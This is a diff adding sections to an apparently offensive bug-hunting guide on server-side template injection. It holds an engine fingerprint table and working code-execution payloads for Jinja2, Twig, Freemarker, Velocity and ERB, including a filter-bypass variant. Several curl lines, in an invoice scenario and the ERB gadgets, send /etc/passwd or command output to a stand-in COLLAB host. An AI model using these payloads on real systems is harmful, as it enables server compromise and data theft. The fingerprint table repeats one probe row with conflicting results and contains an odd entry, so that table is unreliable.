@@ -212,6 +212,56 @@ A Java-based CMS allowed editors with limited privileges to preview page templat
 **Scenario C — PDF Generator SSTI (Blind ERB → RCE)**
 A Ruby on Rails application generated PDF invoices using a server-side template. The invoice included the customer's name and address. An attacker submitted an address with `<%= system("curl -F 'data=@/etc/passwd' http://COLLAB/exfil") %>`. When the PDF was generated, the ERB template executed the command, exfiltrating the server's password file. Impact: full server compromise via a blind SSTI in the PDF generation pipeline.
 
+### Phase 5 — Engine Fingerprint Table
+
+Use differential probes on math expressions to identify the template engine before attempting RCE:
+
+| Probe | Jinja2 | Twig | Freemarker | Velocity | ERB | EJS | Pug |
+|---|---|---|---|---|---|---|---|
+| `{{7*7}}` | 49 | 49 | 49 | 49 | — | 49 | — |
+| `${7*7}` | ${7*7} | ${7*7} | 49 | 49 | — | ${7*7} | — |
+| `<%=7*7%>` | <%=7*7%> | — | — | — | 49 | 49 | — |
+| `#{7*7}` | — | — | 49*7 (literal) | — | 49 | — | — |
+| `a{*comment*}b` | — | ab | — | — | — | — | — |
+| `#{7*7}` | — | — | — | `7*7` (string) | — | — | — |
+
+### Phase 6 — Engine-Specific RCE Gadgets
+
+**Jinja2 (Python):**
+```python
+# Class walker (no globals)
+{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read() }}
+
+# Attr filter bypass (WAF evasion)
+{{ request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__self__') }}
+
+# lipsum globals access
+{{ lipsum.__globals__['os'].popen('id').read() }}
+```
+
+**Twig (PHP):**
+```php
+{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
+{{ ['id']|filter('system') }}
+```
+
+**Freemarker (Java):**
+```java
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+```
+
+**Velocity (Java):**
+```java
+#set($s="") #set($stringClass=$s.getClass()) #set($rt=$stringClass.forName("java.lang.Runtime")) $rt.getRuntime().exec("id")
+```
+
+**ERB (Ruby):**
+```ruby
+<%= `id` %>
+<%= system("curl http://COLLAB/$(id)") %>
+```
+
 ## Related Skills
 
 - **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
